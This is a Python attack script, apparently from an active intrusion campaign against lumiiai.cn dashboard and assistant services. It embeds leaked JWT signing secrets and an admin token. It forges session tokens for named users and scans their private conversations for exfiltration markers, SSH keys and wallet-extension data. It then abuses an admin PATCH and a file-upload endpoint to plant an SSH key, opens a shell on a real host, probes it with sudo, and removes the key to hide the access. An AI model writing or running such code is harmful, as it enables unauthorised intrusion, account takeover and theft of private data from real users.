#!/usr/bin/env python3
# ci-29481b round 1:
#  (A) full message scan on assistant.lumiiai.cn for MAC_SHORT / MAC_EXFIL markers that may
#      have been executed by the REAL Brians-MBP-2 device and landed in conversation messages.
#  (B) shell on 122.51.1.87 (plant key via dashboard files-RPC local-fallback) to read the
#      127.0.0.1:8788 relay process/source/logs and calibrate the exact semantics of
#      "bridge connection replaced" around our dispatch times 20:31:35/50, 20:32:04/18.
import os, sys, json, re, time, base64, hmac, hashlib, subprocess
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
ASSIST = "assistant.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ASSIST_JWT_SECRET = "ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"
BRIAN = "usr_j7t9Dhq4M4obQkag5huJi"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
TARGET = "122.51.1.87"
RESTORE_DEFAULT = {"ip": "52.53.251.49", "sshUser": "root"}
KEY = "/tmp/ak29481b"

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)

def Rchunk(prefix, v, size=45000):
    s = _b(v)
    for i in range(0, len(s), size):
        print("R:%s__%03d:%s" % (prefix, i // size, s[i:i+size]), flush=True)

def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout, input=b"")
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def curl_to_file(path, outfile, cookie=None, timeout=60, host=ASSIST):
    url = "https://%s%s" % (host, path)
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Accept: application/json, text/plain, */*",
            "-w", "\n__CODE__%{http_code}", "-o", outfile]
    if cookie: args += ["-H", "Cookie: " + cookie]
    args += [url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0: code = txt[i+8:].strip()[:3]
    return code, (err.decode("utf-8","replace")[:200])

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge_dash(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def forge_assist(sub=BRIAN, org=ORG):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"sub": sub, "org": org, "iat": now, "exp": now + 7200,
                         "sid": "sid_x", "lgn": now}, separators=(",", ":")))
    sig = b64u(hmac.new(ASSIST_JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return "lumii_session=" + h + "." + p + "." + sig

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=60000, host=HOST):
    url = "https://%s%s" % (host, path)
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Accept: application/json, text/plain, */*",
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: " + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "err": err.decode("utf-8","replace")[:300]}

def qp(p): return up.quote(p, safe="/")

def ssh(cmd, timeout=120):
    args = ["ssh", "-i", KEY,
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes",
            "-o", "ConnectTimeout=10", "-o", "LogLevel=ERROR",
            "ubuntu@" + TARGET, cmd]
    return run(args, timeout=timeout + 40)

def upload_key(sess, pub):
    open("/tmp/ak29481b.pub", "w").write(pub + "\n")
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AID, qp("/home/ubuntu/.ssh"))
    args = ["curl", "-s", "-k", "-m", "45", "--http2", "-A", UA, "-H", "Cookie: session=" + sess,
            "-F", "files=@/tmp/ak29481b.pub;filename=authorized_keys2;type=text/plain",
            "-w", "\n__CODE__%{http_code}", url]
    rc, out, err = run(args, timeout=60)
    txt = out.decode("utf-8", "replace"); i = txt.rfind("__CODE__"); code = txt[i+8:].strip()[:3] if i>=0 else ""
    return code, txt[:300]

MARKERS = ["@@@P@@@", "@@@START@@@", "@@@E@@@", "@@@BROWSER", "@@@EXT", "@@@SSH",
           "nkbihfbeogaeaoehlefnkodbefgpgknn", "id_ed25519", "BEGIN OPENSSH",
           "Local Extension Settings", "MAC_EXFIL", "MAC_SHORT", "临时诊断"]

def walk_strings(o, path=""):
    if isinstance(o, dict):
        for k, v in o.items():
            yield from walk_strings(v, path + "." + str(k))
    elif isinstance(o, list):
        for i, v in enumerate(o):
            yield from walk_strings(v, path + "[%d]" % i)
    elif isinstance(o, str):
        yield path, o

def scan_messages(cid, rawpath):
    try:
        j = json.load(open(rawpath))
    except Exception as e:
        return {"conv": cid, "err": "json:" + repr(e)[:80], "size": os.path.getsize(rawpath)}
    msgs = j.get("messages") if isinstance(j, dict) else (j if isinstance(j, list) else [])
    if not isinstance(msgs, list): msgs = []
    hits = []
    first = last = None
    for m in msgs:
        if not isinstance(m, dict): continue
        ts = m.get("createdAt") or m.get("created_at") or m.get("timestamp") or m.get("ts")
        if ts:
            if first is None: first = ts
            last = ts
        blob = json.dumps(m, ensure_ascii=False)
        for mk in MARKERS:
            if mk in blob:
                idx = blob.find(mk)
                hits.append({"id": m.get("id"), "role": m.get("role") or m.get("author") or m.get("type"),
                             "ts": ts, "mk": mk, "snip": blob[max(0,idx-120):idx+240]})
                break
    return {"conv": cid, "n": len(msgs), "first": first, "last": last, "hits": hits[:20]}

# ================= (A) message scan =================
def part_a():
    cookie = forge_assist()
    me = call("/api/me", session=cookie, timeout=25)
    R("A0_me", {"code": me["code"], "body": me["body"][:200]})
    code, err = curl_to_file("/api/conversations?limit=300", "/tmp/convs.json", cookie, timeout=60)
    R("A1_convs_code", {"code": code, "err": err, "size": os.path.getsize("/tmp/convs.json") if os.path.exists("/tmp/convs.json") else 0})
    try:
        j = json.load(open("/tmp/convs.json"))
    except Exception as e:
        R("A1_parse_err", repr(e)[:200]); return
    convs = j.get("conversations") if isinstance(j, dict) else (j if isinstance(j, list) else [])
    if not isinstance(convs, list): convs = []
    summary = []
    targets = []
    WIN = "2026-11-25T20:2"
    for c in convs:
        if not isinstance(c, dict): continue
        cid = c.get("id"); t = c.get("title") or ""
        upd = c.get("updatedAt") or ""
        lma = c.get("lastMessageAt") or ""
        item = {"id": cid, "title": t[:40], "upd": upd, "lma": lma}
        summary.append(item)
        # candidate conversations: created/updated in the campaign window OR titled our temp title
        if ("临时诊断" in t) or (upd >= "2026-11-25T20:2") or (lma >= "2026-11-25T20:2"):
            targets.append(cid)
    R("A2_conv_summary", summary[:80])
    R("A2_targets", targets[:40])
    allscan = []
    for cid in targets[:12]:
        p = "/tmp/msg_%s.json" % re.sub(r"[^A-Za-z0-9]", "_", cid)
        code, err = curl_to_file("/api/conversations/%s/messages?limit=300" % cid, p, cookie, timeout=60)
        sc = scan_messages(cid, p)
        sc["code"] = code
        allscan.append(sc)
    R("A3_scan", allscan)

# ================= (B) relay introspection =================
def part_b():
    r = call("/api/admin/agents", admin=True, timeout=40, maxlen=400000)
    j = {}
    try: j = json.loads(r["body"])
    except Exception: pass
    agents = j.get("agents", []) if isinstance(j, dict) else []
    orig = {}
    for a in agents:
        if a.get("id") == AID:
            orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser")}
    R("B0_admin", {"code": r["code"], "n": len(agents), "target": orig})
    sess = forge_dash(OWNER)
    run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], timeout=30)
    pub = open(KEY + ".pub").read().strip()
    ok = False; tries = []
    for attempt in range(9):
        pr = call("/api/admin/agents", method="PATCH", admin=True,
                  body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=20, maxlen=2000)
        code, ub = upload_key(sess, pub)
        rc, out, err = ssh("id; hostname", timeout=30)
        so = out.decode("utf-8","replace")
        tries.append({"a": attempt, "patch": pr["code"], "up": code, "rc": rc, "ssh": so[:40],
                      "err": err.decode("utf-8","replace")[-60:]})
        if b"uid=" in out:
            ok = True; break
        time.sleep(1)
    R("B1_shell", {"ok": ok, "tries": tries})
    restore = orig if (orig.get("ip") and orig["ip"] not in ("127.0.0.1", "localhost", "LOCAL_HOST")) else RESTORE_DEFAULT
    rr = call("/api/admin/agents", method="PATCH", admin=True,
              body={"id": AID, "host": restore["ip"], "ssh_user": restore.get("sshUser") or "root"}, timeout=20, maxlen=2000)
    R("B2_restore", {"code": rr["code"]})
    if not ok:
        R("B3_result", "NO_SHELL"); return False

    probes = {
        "B4_sudo": "sudo -n true 2>&1 && echo SUDO_OK; id",
        "B5_listen": "ss -ltnp 2>/dev/null | grep -E ':8788|:3003' || netstat -ltnp 2>/dev/null | grep -E ':8788|:3003'",
        "B6_ps": "ps -eo pid,ppid,user,cmd 2>/dev/null | grep -iE 'relay|8788|assistant|bridge' | grep -v grep | head -40",
        "B7_opt": "ls -la /opt 2>/dev/null; echo ---; ls -la /opt/* 2>/dev/null | head -60",
        "B8_proc8788": "pid=$(ss -ltnp 2>/dev/null | grep ':8788' | grep -oE 'pid=[0-9]+' | head -1 | cut -d= -f2); echo PID=$pid; [ -n \"$pid\" ] && (sudo -n readlink /proc/$pid/cwd; sudo -n tr '\\0' ' ' < /proc/$pid/cmdline; echo; sudo -n ls -la /proc/$pid/fd 2>/dev/null | head -20)",
        "B9_grep_src": "sudo -n grep -rIl 'connection replaced' /opt /srv /app /home /root /etc /usr/local 2>/dev/null | head -20",
        "B10_journal": "(sudo -n journalctl --no-pager --since '2026-11-25 20:25:00' --until '2026-11-25 20:55:00' 2>/dev/null | grep -iE 'bridge|replac|dispatch|desktop' | tail -120) || echo NO_JOURNAL",
        "B11_docker": "sudo -n docker ps --format '{{.Names}} {{.Image}} {{.Ports}}' 2>/dev/null | head -30",
        "B12_relaydir": "sudo -n find / -maxdepth 5 -iname '*relay*' 2>/dev/null | grep -vE '/proc|/sys' | head -40",
    }
    for k, cmd in probes.items():
        rc, out, err = ssh(cmd, timeout=90)
        Rchunk(k, {"rc": rc, "out": out.decode("utf-8","replace")[-120000:],
                   "err": err.decode("utf-8","replace")[-500:]})
    rc, out, err = ssh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED", timeout=25)
    R("B99_cleanup", out.decode("utf-8","replace")[:120])
    return True

if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    try:
        if which in ("all", "a"):
            part_a()
    except Exception as e:
        R("A_ERR", repr(e)[:300])
    try:
        if which in ("all", "b"):
            part_b()
    except Exception as e:
        R("B_ERR", repr(e)[:300])
    R("DONE", "ci-29481b round1")
